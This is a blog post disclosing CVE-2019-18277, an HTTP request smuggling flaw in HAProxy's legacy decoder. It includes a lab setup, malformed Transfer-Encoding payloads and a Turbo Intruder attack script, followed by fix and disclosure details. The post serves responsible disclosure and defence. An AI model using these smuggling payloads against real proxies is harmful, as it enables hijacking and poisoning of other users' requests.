@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>HAProxy HTTP request smuggling (CVE-2019-18277) - Nathan Davison</title>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+      <meta name="generator" content="GravCMS" />
+    <meta name="description" content="nathandavison.com" />
+  <link rel="shortcut icon" href="/user/themes/cacti/images/favicon.ico" />
+  <link rel="alternate" type="application/rss+xml" title="My Blog" href="/rss.xml">
+
+          
+      <link href="/user/themes/cacti/css/style.css" type="text/css" rel="stylesheet">
+<link href="/user/plugins/form/assets/form-styles.css" type="text/css" rel="stylesheet">
+<link href="/user/plugins/youtube/css/youtube.css" type="text/css" rel="stylesheet">
+<link href="/user/plugins/highlight/css/vs2015.css" type="text/css" rel="stylesheet">
+<link href="/user/plugins/featherlight/css/featherlight.min.css" type="text/css" rel="stylesheet">
+<link href="/user/plugins/login/css/login.css" type="text/css" rel="stylesheet">
+    
+  </head>
+<body>
+
+    <section id="navigation">
+
+    <nav class="main-nav">
+                                <a class="active" href="/">
+                <span class="arrow">←</span>                                 Blog
+            </a>
+                                <a class="" href="/contact">
+                                                contact
+            </a>
+                    </nav>
+    </section>
+
+    <section id="wrapper">
+                            
+        <div class="">
+            <article class="post">
+        <header>
+            <h1>HAProxy HTTP request smuggling (CVE-2019-18277)</h1>
+            <h2 class="headline">September 19, 2019</h2>
+        </header>
+        <section id="post-body">
+            <p>The following describes a technique to achieve <a href="https://portswigger.net/web-security/request-smuggling">HTTP request smuggling</a> against infrastructure behind a HAProxy server when using specific configuration around backend connection reuse. This was tested against HAProxy versions 1.7.9, 1.7.11, 1.8.19, 1.8.21, 1.9.10, and 2.0.5. Of all these tested versions, only 2.0.5 was not vulnerable out of the box, although it is when using the <code>no option http-use-htx</code> configuration, which reverts back to the legacy HTTP decoder. 2.1 removed the legacy decoder so it is not affected.</p>
+<p>To actually exploit HTTP smuggling using the issue described in this writeup, the backend server(s) behind HAProxy would  also have to be vulnerable in the sense they too would need to suffer from a bug, but one which parses and accepts a poorly formed Transfer-Encoding header (almost certainly violating RFC7230). The backend must also support HTTP keep-alive.</p>
+<h2>The HAProxy bug - sending both Transfer-Encoding and Content-Length</h2>
+<p>This is how HAProxy handles a request when Transfer-Encoding and Content-Length is provided together:</p>
+<p><strong>Request to HAProxy:</strong></p>
+<pre><code class="language-http">POST / HTTP/1.1
+Host: 127.0.0.1:1080
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+X</code></pre>
+<p><strong>Request forwarded to backend:</strong></p>
+<pre><code class="language-http">POST / HTTP/1.1
+Host: 127.0.0.1:1080
+Transfer-Encoding: chunked
+X-Forwarded-For: 172.21.0.1
+
+0
+</code></pre>
+<p>The request HAProxy sends to the backend has correctly prioritized Transfer-Encoding, and has stripped out the content length and cut off the "X" from the request, which went outside the boundry of the Transfer-Encoding request.</p>
+<p>However, in the next request we have a <code>\x0b</code> (vertical tab) before the "chunked" string (note: <code>\x0c</code> aka form feed also works).</p>
+<p><strong>Request to HAProxy:</strong></p>
+<pre><code class="language-http">POST / HTTP/1.1
+Host: 127.0.0.1:1080
+Content-Length: 6
+Transfer-Encoding:[\x0b]chunked
+
+0
+
+X</code></pre>
+<p><strong>Request forwarded to backend:</strong></p>
+<pre><code class="language-http">POST / HTTP/1.1
+Host: 127.0.0.1:1080
+Content-Length: 6
+Transfer-Encoding:
+                  chunked
+X-Forwarded-For: 172.21.0.1
+
+0
+
+X</code></pre>
+<p>In this case, the Transfer-Encoding is not detected by HAProxy, and so the Content-Length is used (and as such, the <code>X</code> is forwarded because it falls within the 6 bytes of body size specified). However, because the Transfer-Encoding header remains in the request sent to the backend, it means that if a backend server manages to parse the Transfer-Encoding header and proceeds to treat the request as a TE encoded request, a desync could occur and the backend TCP socket could be poisoned (in this case, with an "X"). This could then lead to HTTP request smuggling if the connection is being reused for other requests. So it can be said that this HAProxy bug is toothless without a buggy backend, but the backend's bug wouldn't amount to smuggling without the help of the HAProxy bug, if it's sitting behind HAProxy.</p>
+<p>A way to test whether smuggling may be possible against an app behind HAProxy would be to issue a request like as outlined in the <a href="https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn">HTTP Request Smuggling Reborn</a> research, but with the <code>\x0b</code> or <code>\x0c</code> character (which will likely render below as a smaller than usual space between header name and value):</p>
+<pre><code class="language-http">POST / HTTP/1.1
+Host: 127.0.0.1:1080
+Content-Length: 4
+Transfer-Encoding:chunked
+
+1
+Z
+Q</code></pre>
+<p>Because it uses the Content-Length when we have this character in the Transfer-Encoding value, HAProxy will forward the following to the backend:</p>
+<pre><code class="language-http">POST / HTTP/1.1
+Host: 127.0.0.1:1080
+Content-Length: 4
+Transfer-Encoding:
+                  chunked
+X-Forwarded-For: 172.21.0.1
+
+1
+Z</code></pre>
+<p>If the backend parses this request using Transfer-Encoding, then it will timeout waiting for the terminating '0\r\n\r\n'. The aforementioned research classifies it as "CL.TE" desync (correction: this actually appears to be more of a "TE.TE" desync, as the HAProxy frontend will parse TE if it is present, it just doesn't in this specific case when abusing this bug).</p>
+<h2>Request smuggling proof of concept</h2>
+<p>Now we have HAProxy sending through both Content-Length and Transfer-Encoding with potentially conflicting information, we can try to achieve request smuggling. This can be demonstrated using the following setup.</p>
+<h3>HAProxy config</h3>
+<p>Use this <code>haproxy.cfg</code>:</p>
+<pre><code>defaults
+    mode http
+    timeout http-keep-alive 10s
+    timeout connect 5s
+    timeout server 60s
+    timeout client 30s
+    timeout http-request 30s
+
+backend web
+    http-reuse always
+    server web0 host.docker.internal:6767
+
+frontend http
+    bind *:1080
+    timeout client 5s
+    timeout http-request 10s
+    default_backend web</code></pre>
+<p>You may need to change <code>host.docker.internal</code> to point to the actual backend app (code below), as this currently assumes HAProxy is running in a docker container and the docker host is running the backend server.</p>
+<p>The real key here is <code>http-reuse always</code>, which is not the default option for handling connection reuse in HAProxy. See more detail about this setting here: <a href="http://cbonte.github.io/haproxy-dconv/1.9/configuration.html#4.2-http-reuse">http://cbonte.github.io/haproxy-dconv/1.9/configuration.html#4.2-http-reuse</a>. This is essential to achieve request smuggling, as we want our victim connections from HAProxy to the backend server to reuse our attacker controlled connection.</p>
+<h3>The backend</h3>
+<p>For the backend, we need a HTTP server which will go along with the HAProxy keep-alives, and which will parse the malformed Transfer-Encoding header as valid, and also prioritize the Transfer-Encoding over Content-Length. This could describe many backend servers, but one I've found is the Python gunicorn app server (tested against the current latest 19.9.0) when combined with any of the workers except sync (doesn't support keep-alive) and tornado. Below I have a demo web app using Flask that should be vulnerable to request smuggling when combined with the HAProxy bug. First let's install the prereqs:</p>
+<pre><code class="language-bash">pip install flask
+pip install gunicorn
+pip install gunicorn[gevent]</code></pre>
+<p>And the app <code>backend.py</code>:</p>
+<pre><code class="language-python">from flask import Flask, request, jsonify
+
+app = Flask(__name__)
+
+@app.route('/', methods=['GET', 'POST'])
+def main():
+    # the next line is required for Transfer-Encoding support in the request
+    request.environ['wsgi.input_terminated'] = True
+    headers = {}
+    for header in request.headers:
+        headers[header[0]] = header[1]
+    return jsonify(body=request.data, headers=headers)</code></pre>
+<p>gunicorn is used to serve the application, and we need to specify a non default worker to enable keep-alive:</p>
+<pre><code class="language-bash">gunicorn --keep-alive 10 -k gevent --bind 0.0.0.0:6767 -w 4 backend:app</code></pre>
+<p>Now with HAProxy running the above config and our backend server running, we should be able to test it for smuggling. The best way to do this from my experience is using Burp Suite's Turbo Intruder extension with the following script:</p>
+<pre><code class="language-python">def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint='http://127.0.0.1:1080',
+                           concurrentConnections=1,
+                           requestsPerConnection=1,
+                           pipeline=False,
+                           maxRetriesPerRequest=0
+                           )
+
+    attack = '''POST / HTTP/1.1
+Host: 127.0.0.1:1080
+Content-Length: 37
+Connection: keep-alive
+Transfer-Encoding:chunked
+
+1
+A
+0
+
+GET / HTTP/1.1
+X-Foo: bar'''
+    engine.queue(attack)
+    engine.start()
+
+def handleResponse(req, interesting):
+    table.add(req)
+    if req.code == 200:
+        victim = '''GET / HTTP/1.1
+Host: 127.0.0.1:1080
+Connection: close
+
+'''
+
+        for i in range(10):
+            req.engine.queue(victim)</code></pre>
+<p>Note the <code>concurrentConnections=1</code> and <code>requestsPerConnection=1</code> configuration in this script - this should avoid encountering false positives, where we are poisoning our client to HAProxy connection instead of HAProxy to backend. You may need to change the endpoint and Host headers to suit your environment.</p>
+<p>How do we know we have achieved smuggling? when we launch this attack in Turbo Intruder, one of the victim results (likely the first) should stand out response size wise. Going back to the above app code, we are echoing out the request headers in the response. Here is what the response for the poisoned victim request looks like:</p>
+<pre><code class="language-json">{"body":"","headers":{"Host":"127.0.0.1:1080","X-Foo":"barGET / HTTP/1.1"}}</code></pre>
+<p>We can see here that the <code>X-Foo: bar</code> header in the attacker request is present in a victim request's headers, and the <code>GET / HTTP/1.1</code> that the victim really wanted to request has been appended to this. This is a smuggled header, achieving HTTP request smuggling.</p>
+<h2>Fix</h2>
+<p>The HAProxy bug which allows the malformed Transfer-Encoding header through was <a href="https://www.mail-archive.com/haproxy@formilux.org/msg34926.html">fixed in 2.0.6</a> for those on 2.0.x who need the <code>no option http-use-htx</code> config. In 1.9, you should be able to use <code>option http-use-htx</code> to switch to the new HTTP decoder which is enabled by default in 2.0, which is not vulnerable to this bug. For those on 1.9 who need to use the legacy decoder or on earlier versions, the commit message <a href="https://git.haproxy.org/?p=haproxy-2.0.git;a=commit;h=196a7df44d8129d1adc795da020b722614d6a581">https://git.haproxy.org/?p=haproxy-2.0.git;a=commit;h=196a7df44d8129d1adc795da020b722614d6a581</a> suggests it will be back ported to all maintained versions (which appears to be 1.6 and above at the time or writing).</p>
+<p>As <code>http-reuse always</code> is needed to demonstrate smuggling, it may also be worth reconsidering this HAProxy configuration if you have it.</p>
+<h2>Reporting timeline</h2>
+<ul>
+<li>Reported the malformed Transfer-Encoding bug to HAProxy maintainers on September 7th 2019.</li>
+<li>Fixed in <a href="https://www.mail-archive.com/haproxy@formilux.org/msg34926.html">HAProxy 2.0.6 on September 13th 2019</a></li>
+<li>CVE-2019-18277 assigned on 23/10/2019.</li>
+</ul>
+<h2>Thanks</h2>
+<p>A big thanks to <a href="https://twitter.com/albinowax">James Kettle</a> for the advice, and particularly for the tip on the Turbo Intruder script and needing <code>requestsPerConnection=1</code> to avoid false positives with smuggling. Also, thanks to the HAProxy maintainers for their responsiveness and advice to help further understand the issue.</p>
+        </section>
+    </article>
+    <footer id="post-meta" class="clearfix">
+        <a href="http://twitter.com/nj_dav">
+            <img class="avatar" src="/user/themes/cacti/images/avatar.png">
+            <div>
+                <span class="dark">Nathan Davison</span>
+                <span>Blogging about web security stuff</span>
+            </div>
+        </a>
+
+        <section id="sharing">
+            <a class="twitter" href="https://twitter.com/intent/tweet?text=HAProxy HTTP request smuggling (CVE-2019-18277) by @nj_dav - http://localhost/blog/haproxy-http-request-smuggling"><span class="icon-twitter"> Tweet</span></a>
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+        </section>
+    </footer>
+
+    <nav id="post-nav" class="clearfix">
+                <span class="prev">
+            <a href="/blog/abusing-http-hop-by-hop-request-headers"><span class="arrow">←</span> Abusing HTTP hop-by-hop request headers</a>
+        </span>
+        
+                <span class="next">
+            <a href="/blog/corsing-a-denial-of-service-via-cache-poisoning">CORS'ing a Denial of Service via cache poisoning <span class="arrow">→</span></a>
+        </span>
+            </nav>
+
+
+    <!-- Disqus comments -->
+    
+    <!-- Archive post list -->
+    
+            </div>
+
+                <footer id="footer">
+    <p class="small">© Copyright 2023</p>
+</footer>
+            </section>
+
+        
+                      
+      <script src="/assets/ab993aa8955cc9b4d8ab5a20cb172675.js"></script>
+<script>
+hljs.initHighlightingOnLoad();
+</script>
+<script>
+$(document).ready(function(){
+    $('a[rel="lightbox"]').featherlight({
+        openSpeed: 250,
+        closeSpeed: 250,
+        closeOnClick: 'background',
+        closeOnEsc: '1',
+        root: 'body'
+    });
+});
+</script>
+
+    
+  </body>
+</html>
